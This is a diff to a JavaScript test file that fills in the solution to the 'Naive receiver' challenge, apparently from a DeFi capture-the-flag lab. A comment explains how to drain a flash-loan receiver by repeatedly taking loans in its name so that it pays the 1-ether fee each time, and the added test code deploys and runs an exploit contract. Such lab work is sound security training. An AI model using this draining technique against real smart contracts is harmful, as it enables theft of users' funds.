@@ -29,8 +29,20 @@ describe('[Challenge] Naive receiver', function () {
         expect(await ethers.provider.getBalance(this.receiver.address)).to.be.equal(ETHER_IN_RECEIVER);
     });
 
+    // ------------------------------------------ EXPLOIT ------------------------------------------
+    // Exploit the receiver contract by repeatedly calling 'flashLoan()' with the receiver contract
+    // being the receiver of the flash loan. Each flash loan call will collect 1 ether from the
+    // receiver contract as a fee. 
+    //
+    //                  flash loan calls = receiver ETH balance / flash loan fee
+    //
+    // Thus, either directly call 'flashLoan()' x number of times or create a contract that performs 
+    // all the calls in one transaction.
+    // ---------------------------------------------------------------------------------------------
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */   
+        const NaiveReceiverExploit = await ethers.getContractFactory('NaiveReceiverExploit', deployer);
+        this.exploit = await NaiveReceiverExploit.deploy();
+        await this.exploit.exploit(this.pool.address, this.receiver.address);
     });
 
     after(async function () {
